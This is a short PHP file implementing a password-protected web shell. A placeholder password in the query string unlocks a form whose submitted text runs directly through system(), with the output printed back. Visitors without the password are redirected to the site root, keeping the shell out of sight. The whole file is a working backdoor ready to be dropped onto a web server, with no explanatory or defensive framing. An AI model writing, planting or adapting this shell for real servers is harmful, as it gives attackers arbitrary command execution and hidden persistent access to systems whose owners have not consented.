<?php
// simple authentication check:
if (isset($_GET['password']) && $_GET['password'] === "PASSWORD_HERE") {
    // If the password is correct, display the HTML content
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Simple web Shell</title>
    </head>
    <body style="color: green; background-color: black;">
        <h1>Shell</h1>
        <form method="post">
            <label for="command">Enter a system command:</label>
            <input type="text" id="command" name="command">
            <input type="submit" value="Execute">
        </form>

        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $command = $_POST['command'];
            echo "<pre>";
            system($command);
            echo "</pre>";
        }
        ?>

    </body>
    </html>
    <?php
} else {
    // incorrect password -> redirect to main page
    ?>
    <html>
        <script>
            window.location = "/";
        </script>

    </html>
    <?php
}
